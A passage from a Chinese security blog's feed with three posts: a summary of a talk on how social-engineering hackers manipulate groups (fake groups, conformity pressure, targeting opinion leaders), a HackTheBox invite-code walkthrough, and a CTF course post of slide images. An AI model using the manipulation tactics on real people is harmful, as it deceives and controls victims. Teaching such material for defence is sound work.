社工黑客攻击群体的思路</h2><ol><li><p>社工黑客只需要从信息的角度去观察“群体”，而没必要像心理<br>学家那样去全面考虑“群体”。</p></li><li><p>如果组成某群体的个体之间，完全隔离，即，群体成员彼此没有任何信息的交往；那么，黑客便可把这种群体，看成一些独立的“热血电脑”的堆集。既可以独立地，分别攻破这些“热血电<br>脑”；又可以找出他们的共同特点，然后“一箭多雕”。</p></li><li><p>其实，绝大部分群体都应该是这样的：群体成员彼此之间，存在着或多或少的信息交流；因此，在社工黑客看来，群体只不过是由“热血电脑”组成的网络而已；</p></li><li><p>总之，在社工黑客眼里，群体的信息交流架构，完全等同于众所周知的、由冷血电脑搭建的互联网的信息交流架构；因此，黑客可借用已经相当熟悉的、攻击冷血网络的思路，来攻击群体这个“热血网络”</p></li><li><p>若非要在群体这个“热血网络”和“冷血网络”中找出什么差别<br>的话；那针对群体这个“热血网络”的活性（即，它会不断演化、生长），社工黑客还有如下更多的、有利的攻击机会：</p></li></ol><h2 id="2-12-社工黑客攻击群体的便利"><a href="#2-12-社工黑客攻击群体的便利" class="headerlink" title="2.12 社工黑客攻击群体的便利"></a>2.12 社工黑客攻击群体的便利</h2><ol><li><p>合群机会<br>1）合群倾向，有助于社工黑客“打入敌人内部”，从而有利<br>于后续攻击；<br>2）充分合群后，群体成员之间会越来越趋同，从而有利于提<br>高攻击效率，甚至：攻破一个成员后，与其相似的成员也将<br>全被攻破；<br>3）充分合群后，群体中信息交流将更密切；</p><pre><code>故篡改、破坏或截获相关信息将更易；通过一台“热血电脑”做跳板，去远程攻击另一台“热血脑”也更易；黑客隐身也更简单</code></pre></li><li><p>遵从和依从的机会<br>人类普遍存在遵从和服从现象，特别是当来自群体的压力很<br>大，比如，群体中每个人都做出同样的反应时，个人就会有<br>强烈的动机去赞同群体其他成员的意见。</p></li><li><p>充分利用该机会，黑客便能对“热血网络”发动非常有效的攻击，</p><p>比如：将被攻击目标（个体或者小群体）纳入事先伪造好的<br>某个大群体，然后通过操控这个“假冒群体”，来达到操控受害者的目的</p></li><li><p>“热血网络”的单核心信息传输模式</p><ol><li>无论在什么环境下，几乎所有群体，都有一个共同特征，即，群体中总有某些人（意见领袖）说得很多，而其他人则说得很少。</li><li>“热血网络”的信息传输拓扑结构，远比真实互联网这些冷血网络的拓扑结构还要简单明晰；因为它只有一个信息交流的主节点，而其它节点的信息交流量都很少。</li><li>这种单核心结构，对社工黑客显然是有利的。</li></ol></li><li><p>“热血网络”的双核心信息交流结构</p><ol><li>有时群体中会出现两个核心：其一，是意见领袖，他说话最多；其二，是领导，他说话最管用。他们都是社工黑客的重点关注对象。</li><li>通过说话量，社工黑客可准确判断群体的意见领袖；这相当于找到冷血网络中的骨干路由器节点，从而有利于准确找到其攻击目标，因为现实中经常是“领导的话普遍偏多”，而且，即使信息交流受到限制，交流受限最少的人，往往也是领导。</li></ol></li></ol><h2 id="2-13-社工黑客的漏洞思维"><a href="#2-13-社工黑客的漏洞思维" class="headerlink" title="2.13 社工黑客的漏洞思维"></a>2.13 社工黑客的漏洞思维</h2><ol><li>在冷血网络的信息安全对抗中，黑客和红客的主要战场，可能要算“漏洞挖掘”了</li><li>既然社工黑客将人类个体看成“热血电脑”，将人类群体看成<br>“热血网络”；所以，挖掘相应的人性漏洞，也是红黑双方信息<br>安全对抗的核心战场</li><li>与冷血网络不同的是，许多热血漏洞，根本无法“打补丁”，因<br>为，某些漏洞干脆就是人的本能或潜意识习惯</li><li>从漏洞角度看，社工黑客比纯技术黑客处于更有利的地位；换句话说，我们更应该重视如何对抗社工黑客。</li><li>幸好，社工黑客的攻击，几乎都是循环反馈的“赛博式”攻击，<br>所以，只要在其攻击过程中的任何一个环节，挡住了黑客，就算</li><li>红客成功<ol><li>人性漏洞非常多：</li><li>有输入漏洞</li><li>输出漏洞</li><li>处理漏洞</li><li>存储漏洞等四大类漏洞</li></ol></li></ol><h2 id="2-14-社工黑客的战术清单"><a href="#2-14-社工黑客的战术清单" class="headerlink" title="2.14 社工黑客的战术清单"></a>2.14 社工黑客的战术清单</h2><ol><li>感觉漏洞的挖掘和利用</li><li>知觉漏洞的挖掘和利用</li><li>记忆博弈</li><li>情结博弈</li><li>注意控制</li><li>动机诱惑</li><li>微表情泄密</li><li>肢体语言泄密</li><li>姿势泄密</li><li>喜欢的引发和利用</li><li>利他与易控行为的利用</li><li>态度的控制</li><li>人际关系的利用和控制</li></ol><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h1><p>个人感觉内容挺充实的，大家有兴趣的可以在去看看他的那本书。本人还没看过，不过有点子版本的，有需要的可以在下方留下联系方式。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c33229afd072e890" class="lozad"></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;该文章整理自第七届互联网安全大会，杨义先教授的PPT内容。杨义先-北京邮电大学信息安全中心主任。&lt;/
      
    
    </summary>
    
      <category term="社会工程" scheme="https://www.mad-coding.cn/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="社工" scheme="https://www.mad-coding.cn/tags/%E7%A4%BE%E5%B7%A5/"/>
    
  </entry>
  
  <entry>
    <title>hackthebox初探之获取邀请码</title>
    <link href="https://www.mad-coding.cn/2019/11/11/hackthebox%E5%88%9D%E6%8E%A2%E4%B9%8B%E8%8E%B7%E5%8F%96%E9%82%80%E8%AF%B7%E7%A0%81/"/>
    <id>https://www.mad-coding.cn/2019/11/11/hackthebox初探之获取邀请码/</id>
    <published>2019-11-11T09:42:57.000Z</published>
    <updated>2019-11-13T10:04:48.639Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今日，一同事和我提到hackthebox，通过搜索得知hackthebox是国外的一个CTF在线靶场平台，靶机数量很大，有免费和花钱的（这是一个为知识付费的时代，好东西都是要花钱的）。不过在注册的时候就设置了一个门槛，需要获取邀请码才能注册，而这个邀请码和国内的一些平台不太一样，需要自己去寻找，今天给大家分享的就是如何如找到邀请码。</p><a id="more"></a><h1 id="0x01-走捷径"><a href="#0x01-走捷径" class="headerlink" title="0x01 走捷径"></a>0x01 走捷径</h1><p>因为网上已经有很多人介绍了获取邀请码的教程，大家如果不想知道原理的话，可以走捷径直接获取注册。</p><p>在kali或者其他Linux系统中使用curl命令直接获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://www.hackthebox.eu/api/invite/generate -X POST</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111175831.png" class="lozad"></p><p>code中的数据值就是我们需要的邀请码，不过是base64加密的，解密一下就好了。</p><h1 id="0x02-自己摸索思路"><a href="#0x02-自己摸索思路" class="headerlink" title="0x02 自己摸索思路"></a>0x02 自己摸索思路</h1><p>首先访问hackthebox官网：<a href="https://www.hackthebox.eu/" target="_blank" rel="noopener">https://www.hackthebox.eu/</a></p><p>查看源代码，按Ctrl + F 搜索invite，发现有个inviteapi.min.js文件，点击访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181018.png" class="lozad"></p><p>再次搜索invite可以定位到有makeInviteCode这个方法。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181027.png" class="lozad"></p><p>在输入邀请码的地方按f12，在控制台输入makeInviteCode（）回车</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181102.png" class="lozad"></p><p>发现是一个rot13加密的数据，复制数据扔到<a href="https://rot13.com/网站中去解密" target="_blank" rel="noopener">https://rot13.com/网站中去解密</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181116.png" class="lozad"></p><p>从解密结果可以看出，需要提交一个post请求到<code>www.hackthebox.eu/api/invite/generate</code>这个url到这里就有很多思路了，这里提供两个思路给大家，第一个是使用burpsuite抓包然后修改请求的链接和请求方法，第二个是直接使用curl命令去请求。</p><p>【方法一:使用burpsuite】</p><p>先在hackthebox网站上抓一个包，然后发送到repeater模块，修改链接和请求方法，在go一下即可看到回显的邀请码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181146.png" class="lozad"></p><p>发送到decoder模块解码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181212.png" class="lozad"></p><p>后者右击直接解码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181222.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181237.png" class="lozad"></p><p>【方法二:还是用curl命令】</p><blockquote><p>curl<br><a href="https://www.hackthebox.eu/api/invite/generate" target="_blank" rel="noopener">https://www.hackthebox.eu/api/invite/generate</a><br>-X POST</p></blockquote><h1 id="0x03-其他教程链接"><a href="#0x03-其他教程链接" class="headerlink" title="0x03 其他教程链接"></a>0x03 其他教程链接</h1><p><a href="https://blog.csdn.net/u010953692/article/details/82024150" target="_blank" rel="noopener">https://blog.csdn.net/u010953692/article/details/82024150</a></p><p><a href="https://www.bus123.net/10123.html" target="_blank" rel="noopener">https://www.bus123.net/10123.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今日，一同事和我提到hackthebox，通过搜索得知hackthebox是国外的一个CTF在线靶场平台，靶机数量很大，有免费和花钱的（这是一个为知识付费的时代，好东西都是要花钱的）。不过在注册的时候就设置了一个门槛，需要获取邀请码才能注册，而这个邀请码和国内的一些平台不太一样，需要自己去寻找，今天给大家分享的就是如何如找到邀请码。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF相关" scheme="https://www.mad-coding.cn/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="hackthebox" scheme="https://www.mad-coding.cn/tags/hackthebox/"/>
    
  </entry>
  
  <entry>
    <title>CTF夺旗训练视频课程PPT</title>
    <link href="https://www.mad-coding.cn/2019/11/05/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83%E8%A7%86%E9%A2%91%E8%AF%BE%E7%A8%8BPPT/"/>
    <id>https://www.mad-coding.cn/2019/11/05/CTF夺旗训练视频课程PPT/</id>
    <published>2019-11-05T01:30:25.000Z</published>
    <updated>2019-11-15T08:46:50.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-CTF训练-课程介绍"><a href="#0x00-CTF训练-课程介绍" class="headerlink" title="0x00 CTF训练-课程介绍"></a>0x00 CTF训练-课程介绍</h1><p>前些日子因为参加CTF比赛，朋友发了我一些CTF的资料，今天整理资料的过程中发现还有这个一系列课程的PPT，为了方便学习查看，将PPT汇总成文档吧。</p><a id="more"></a><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093602.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093633.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093649.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093700.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093712.png" class="lozad"></p><h1 id="0x01-CTF训练-环境搭建"><a href="#0x01-CTF训练-环境搭建" class="headerlink" title="0x01 CTF训练-环境搭建"></a>0x01 CTF训练-环境搭建</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093756.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093807.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093822.png" class="lozad"></p><h1 id="0x02-靶场夺旗"><a href="#0x02-靶场夺旗" class="headerlink" title="0x02 靶场夺旗"></a>0x02 靶场夺旗</h1><h1 id="0x03-CTF训练-POST注入-HTTP报文注入"><a href="#0x03-CTF训练-POST注入-HTTP报文注入" class="headerlink" title="0x03 CTF训练-POST注入-HTTP报文注入"></a>0x03 CTF训练-POST注入-HTTP报文注入</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094457.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094516.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094525.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094534.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094543.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094553.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094602.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094619.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094627.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094635.png" class="lozad"></p><h1 id="0x04-CTF训练-PUT漏洞"><a href="#0x04-CTF训练-PUT漏洞" class="headerlink" title="0x04 CTF训练-PUT漏洞"></a>0x04 CTF训练-PUT漏洞</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094710.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094720.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094734.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094750.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094757.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094810.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094818.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094827.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094837.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094844.png" class="lozad"></p><h1 id="0x05-CTF训练-SQL注入GET参数"><a href="#0x05-CTF训练-SQL注入GET参数" class="headerlink" title="0x05 CTF训练-SQL注入GET参数"></a>0x05 CTF训练-SQL注入GET参数</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094906.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094916.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094929.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094941.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094953.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095007.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095016.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095027.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095033.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095041.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095055.png" class="lozad"></p><h1 id="0x06-CTF训练-SSH服务渗透"><a href="#0x06-CTF训练-SSH服务渗透" class="headerlink" title="0x06 CTF训练-SSH服务渗透"></a>0x06 CTF训练-SSH服务渗透</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095115.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095135.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095144.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095152.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095200.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095214.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095221.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095228.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095234.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095240.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095247.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095253.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095258.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095305.png" class="lozad"></p><h1 id="0x07-CTF训练-SSH私钥泄露"><a href="#0x07-CTF训练-SSH私钥泄露" class="headerlink" title="0x07 CTF训练-SSH私钥泄露"></a>0x07 CTF训练-SSH私钥泄露</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095357.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095410.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095416.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095424.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095432.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095440.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095448.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095457.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095502.png" class="lozad"></p><h1 id="0x08-CTF训练-SSI注入"><a href="#0x08-CTF训练-SSI注入" class="headerlink" title="0x08 CTF训练-SSI注入"></a>0x08 CTF训练-SSI注入</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095521.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095534.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095542.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095547.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095608.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095617.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095625.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095632.png" class="lozad"></p><h1 id="0x09-CTF训练-FTP服务安全"><a href="#0x09-CTF训练-FTP服务安全" class="headerlink" title="0x09 CTF训练-FTP服务安全"></a>0x09 CTF训练-FTP服务安全</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093855.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093906.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093916.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094354.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094405.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094416.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094428.png" class="lozad"></p><h1 id="0x10-CTF训练-暴力破解"><a href="#0x10-CTF训练-暴力破解" class="headerlink" title="0x10 CTF训练-暴力破解"></a>0x10 CTF训练-暴力破解</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095928.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095935.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095943.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095949.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095955.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100001.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100007.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100012.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100018.png" class="lozad"></p><h1 id="0x11-CTF-SMB信息泄露"><a href="#0x11-CTF-SMB信息泄露" class="headerlink" title="0x11 CTF-SMB信息泄露"></a>0x11 CTF-SMB信息泄露</h1><h1 id="0x12-CTF训练-路径遍历-提权"><a href="#0x12-CTF训练-路径遍历-提权" class="headerlink" title="0x12 CTF训练-路径遍历 - 提权"></a>0x12 CTF训练-路径遍历 - 提权</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100047.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100056.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100104.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100112.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100122.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100128.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100133.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100139.png" class="lozad"></p><h1 id="0x13-CTF训练-路径遍历（www-data）"><a href="#0x13-CTF训练-路径遍历（www-data）" class="headerlink" title="0x13 CTF训练-路径遍历（www-data）"></a>0x13 CTF训练-路径遍历（www-data）</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100152.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100203.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100213.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100221.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100227.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100234.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100240.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100246.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100255.png" class="lozad"></p><h1 id="0x14-CTF训练-命令执行"><a href="#0x14-CTF训练-命令执行" class="headerlink" title="0x14 CTF训练-命令执行"></a>0x14 CTF训练-命令执行</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100344.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100354.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100400.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100407.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100413.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100420.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100425.png" class="lozad"></p><h1 id="0x15-CTF训练-命令注入（集成工具）"><a href="#0x15-CTF训练-命令注入（集成工具）" class="headerlink" title="0x15 CTF训练-命令注入（集成工具）"></a>0x15 CTF训练-命令注入（集成工具）</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100440.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100449.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100457.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100503.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100511.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100520.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100527.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100533.png" class="lozad"></p><h1 id="0x16-CTF训练-命令注入综合"><a href="#0x16-CTF训练-命令注入综合" class="headerlink" title="0x16  CTF训练-命令注入综合"></a>0x16  CTF训练-命令注入综合</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100556.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100604.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100609.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100614.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100638.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100644.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100648.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100654.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100702.png" class="lozad"></p><h1 id="0x17-CTF训练-注入X-Forwarded-For头"><a href="#0x17-CTF训练-注入X-Forwarded-For头" class="headerlink" title="0x17 CTF训练-注入X-Forwarded-For头"></a>0x17 CTF训练-注入X-Forwarded-For头</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100716.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100727.png" class="lozad"><br><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100736.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100743.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100749.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100756.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100804.png" class="lozad"></p><h1 id="0x18-SMB信息泄露"><a href="#0x18-SMB信息泄露" class="headerlink" title="0x18 SMB信息泄露"></a>0x18 SMB信息泄露</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100859.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100907.png" 